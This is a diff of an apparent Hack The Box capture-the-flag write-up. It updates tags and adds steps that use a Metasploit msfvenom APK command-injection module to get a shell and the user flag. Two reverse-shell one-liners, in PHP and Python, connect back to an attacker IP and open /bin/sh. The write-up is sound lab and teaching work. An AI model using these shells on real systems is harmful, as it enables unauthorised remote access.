@@ -21,9 +21,9 @@ output: html_document
 </div>
 
 **Ports/services exploited:** 5000/http
-**Tools:** \\
-**Techniques:** \\
-**Keywords:** werkzeug\\
+**Tools:** Metasploit\\
+**Techniques:** Enumeration\\
+**Keywords:** msfvenom vulnerability, APK file, reverse shell\\
 
 
 ## 1. Port scanning
@@ -46,7 +46,7 @@ We browse to 10.10.10.226:5000 and find the following page:
 ![web site]({{https://jsom1.github.io/}}/_images/htb_sk_site.png)
 </div>
 
-While will try its functionnalities, we start dirbuster in the background:
+While we try its functionnalities, we can start dirbuster in the background:
 
 ````
 sudo dirb http://10.10.10.226:5000 -r
@@ -298,7 +298,22 @@ php -r ‘$sock=fsockopen(“10.10.14.22”,4444);exec(“/bin/sh -i <&3 >&3 2>&
 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.22”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
 ````
 
-I tried all of them and nothing works.
+None of these worked. I usually couldn't even run the script because of errors. Let's get back at the Metasploit exploit *unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection*. I might have done a mistake earlier.
+
+<div class="img_container">
+![metasploit config]({{https://jsom1.github.io/}}/_images/htb_sk_metaok.png)
+</div>
+
+The file is saved at /root/.msf4/local/msf.apk. We make it executable (*sudo chmod +x /root/.msf4/local/msf.apk*) and start a listener. Then, we upload this file on the server:
+
+<div class="img_container">
+![user flag]({{https://jsom1.github.io/}}/_images/htb_sk_flag.png)
+</div>
+
+And it worked! I'm confused and don't understand why it didn't work manually. The exploit is based on the PoC and it should work. Anyway, let's find a way to root!\\
+
+
+
 
 
 
@@ -307,6 +322,8 @@ I tried all of them and nothing works.
 
 
 <ins>**My thoughts**</ins>
-
+Lost time in a rabbit hole
+Various shell payloads
+Would give up if I didn't know there was a vulnerability
 
 
